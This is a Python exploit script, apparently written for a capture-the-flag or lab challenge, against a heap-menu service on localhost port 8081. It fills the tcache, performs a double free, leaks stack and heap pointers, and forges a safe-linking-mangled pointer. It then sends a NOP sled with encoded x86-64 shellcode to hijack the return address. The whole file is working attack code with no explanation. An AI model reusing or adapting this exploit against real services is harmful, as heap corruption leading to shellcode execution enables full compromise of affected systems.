from socket import *
from pwn import p64
from time import sleep
from sys import exit

offset = 312

payload = b"\x90" * 32
payload += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
payload += b"\x05\xef\xff\xff\xff\x48\xbb\x73\x02\x17\xaa\xcb"
payload += b"\x2e\x99\xe2\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
payload += b"\xff\xe2\xf4\x19\x2b\x4f\x33\xa1\x2c\xc6\x88\x72"
payload += b"\x5c\x18\xaf\x83\xb9\xd1\x5b\x71\x02\x06\xf6\xb4"
payload += b"\x2e\x99\xe3\x22\x4a\x9e\x4c\xa1\x3e\xc3\x88\x59"
payload += b"\x5a\x18\xaf\xa1\x2d\xc7\xaa\x8c\xcc\x7d\x8b\x93"
payload += b"\x21\x9c\x97\x85\x68\x2c\xf2\x52\x66\x22\xcd\x11"
payload += b"\x6b\x79\x85\xb8\x46\x99\xb1\x3b\x8b\xf0\xf8\x9c"
payload += b"\x66\x10\x04\x7c\x07\x17\xaa\xcb\x2e\x99\xe2"

payload+= b"B" * (offset - len(payload))

def allocate(data="CHUNK\n"):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect(("127.0.0.1", 8081))
    sleep(0.2)
    sock.send(b"1\n")
    sleep(0.2)
    if(type(data) == str):
        sock.send(data.encode())
    else:
        sock.send(data)
    sleep(0.2)
    sock.close()

def free(index):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect(("127.0.0.1", 8081))
    sleep(0.2)
    sock.send(b"2\n")
    sleep(0.2)
    sock.send(f"{index}\n".encode())
    sleep(0.2)
    sock.close()

def leak(index):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect(("127.0.0.1", 8081))
    sleep(0.2)
    sock.send(b"4\n")
    sleep(0.2)
    sock.send(f"{index}\n".encode())
    data = sock.recv(50)
    sleep(0.2)
    sock.close()
    return data

def create_chunk():
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect(("127.0.0.1", 8081))
    sleep(0.2)
    sock.send(b"3\n")
    sleep(0.2)
    sock.send(b"\x21\x00\x00\x00\x00\n")
    data = sock.recv(50)
    sleep(0.2)
    sock.close()


for i in range(10):
    allocate()

for i in range(10):
    free(i)
print("[+] Tcache filled")
create_chunk()

for i in range(3):
    allocate("AAAA")

free(10)
free(11)
free(10)
print("[+] Double free")

l = leak(10).split(b"\x00")[0].split(b" ")
input()
print("[+] Pointers leaked")
stack = int(l[0], 16)
current = int(l[1], 16)
print("stack " + hex(stack))
print("current chunk " + hex(current))
final_addr = p64((current >> 12) ^ stack)
# final_addr = p64(stack)
print(f"rebuild addr {final_addr}")

payload+= p64(stack+18)

allocate(final_addr)
allocate("BBBB")
allocate("i had corrupted:)")
print("[+] Sending last payload...")
allocate(payload)


